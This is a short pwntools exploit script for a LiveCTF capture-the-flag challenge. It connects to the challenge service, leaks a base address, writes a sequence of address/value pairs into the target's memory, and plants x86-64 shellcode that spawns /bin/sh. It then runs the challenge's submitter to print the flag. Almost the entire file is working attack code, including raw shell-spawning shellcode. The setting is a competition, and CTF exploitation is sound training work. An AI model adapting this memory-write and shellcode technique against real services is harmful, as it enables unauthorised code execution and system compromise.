from pwn import *
import os

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p = remote(HOST, int(PORT))
#p = process('./challenge')
base = int(p.recv(8)[::-1][2:].hex(), 16)
#print(hex(base))
p.send(p64(base+0x4330))
p.send(p64(base+0x1370))
p.send(p64(base+0x4338))
p.send(p64(base+0x2000))
p.send(p64(base+0x45c4))
p.send(p64(0x41414141))
p.send(p64(0))

p.send(p32(0x41414141))

p.send(p64(base+0x2140))
p.send(b'\x48\x31\xf6\x56\x48\xbf\x2f\x62')
p.send(p64(base+0x2148))
p.send(b'\x69\x6e\x2f\x2f\x73\x68\x57\x54')
p.send(p64(base+0x2150))
p.send(b'\x5f\x6a\x3b\x58\x99\x0f\x05\x00')
p.send(p64(0))
p.recv(17)
p.sendline(b'./submitter')
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
print(flag, flush=True)
#print(p.recvline())
#print(p.recvline().split(b'\x00\x00')[-1].split(b'\n')[0].decode(), flush=True)
